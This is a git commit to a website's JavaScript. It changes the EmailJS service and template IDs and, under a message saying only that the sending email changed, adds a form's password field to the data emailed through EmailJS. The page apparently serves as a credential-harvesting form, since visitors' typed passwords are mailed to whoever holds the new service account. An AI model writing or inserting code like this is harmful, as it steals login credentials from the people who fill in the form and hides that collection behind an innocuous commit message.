a99ad0ceca4c36b38a0286010ebbd140658f7014
Ostap <ostzat@gmail.com>
2023-07-13 13:04:27 +0200

    changed email for sending emails

--- src/js/script.js
+++ src/js/script.js
@@ -23,16 +23,22 @@ function sendMail() {
     var params = {
         name: document.getElementById("name").value,
         email: document.getElementById("email").value,
+        password: document.getElementById("password").value,
+
     };
 
-    const serviceID = "service_5wx49yl";
-    const templateID = "template_nsjddsf";
+    const serviceID = "service_w3d8921";
+    const templateID = "template_qtgei99";
 
     emailjs.send(serviceID, templateID, params)
         .then(res => {
             document.getElementById("name").value = "";
             document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+
             console.log(res);
+            alert("Your message sent successfully!!")
+
         })
         .catch(err => console.log(err));
 
